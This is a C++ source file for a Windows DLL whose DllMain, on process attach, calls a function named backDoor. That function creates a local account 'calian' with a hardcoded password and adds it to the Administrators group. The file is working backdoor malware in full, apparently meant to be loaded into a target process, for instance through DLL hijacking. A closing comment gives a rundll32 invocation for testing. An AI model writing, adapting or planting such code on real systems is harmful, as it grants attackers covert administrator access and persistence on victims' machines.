#include "pch.h"
#include <iostream>
#include <windows.h>
#include <LM.h>
#pragma comment(lib, "Netapi32.lib")
using namespace std;
wstring name = L"calian";
LPWSTR lpName = const_cast<wchar_t*>(name.c_str());
wstring password = L"localadmin123!";
LPWSTR lpPassword = const_cast<wchar_t*>(password.c_str());
DWORD adduserStatus;
USER_INFO_1 userinfo;

int backDoor(USER_INFO_1 userinfo)
{
	userinfo.usri1_name = lpName;
	userinfo.usri1_password = lpPassword;
	userinfo.usri1_password_age = 0;
	userinfo.usri1_priv = USER_PRIV_USER;
	userinfo.usri1_home_dir = NULL;
	userinfo.usri1_comment = NULL;
	userinfo.usri1_flags = UF_NORMAL_ACCOUNT;
	userinfo.usri1_script_path = NULL;
	_LOCALGROUP_MEMBERS_INFO_3 localgroupinfo;
	localgroupinfo.lgrmi3_domainandname = lpName;
	DWORD errorInStruct;
	adduserStatus = NetUserAdd(NULL, 1, (LPBYTE)&userinfo, &errorInStruct);
	if (adduserStatus)
	{
		return adduserStatus;
	}
	adduserStatus = NetLocalGroupAddMembers(NULL, ((wstring)L"Administrators").c_str(), 3, (LPBYTE)&localgroupinfo, 1);
	if (adduserStatus)
	{
		return adduserStatus;
	}

	return 0;
};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		adduserStatus = backDoor(userinfo);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

//Debugging... :)
/*extern "C" __declspec(dllexport) void mydllmain()
{
	MessageBox(0, L"pupupupupupupupu!", 0, 0);
}*/
// Debug: rundll32 .\adduser.dll,mydllmain
